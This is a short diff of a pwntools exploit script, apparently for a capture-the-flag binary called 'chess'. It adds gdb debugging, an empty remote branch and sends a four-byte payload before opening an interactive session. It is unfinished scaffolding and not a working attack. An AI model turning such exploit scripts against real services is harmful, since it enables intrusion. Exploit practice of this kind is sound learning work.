@@ -1,13 +1,19 @@
 from pwn import * 
 
 elf = ELF('./chess')
-context.binary = elf
 context.log_level = 'DEBUG'
 libc = elf.libc
 
-p = process()
-gdb.attach(p)
-p.recv()
+if args['REMOTE']: 
+    pass
+else: 
+    p = process()
+    gdb.attach(p, 'b main')
+    pause()
+
+
 payload = p32(0xFFFF)
+
+p.recv()
 p.sendline(payload)
 p.interactive()
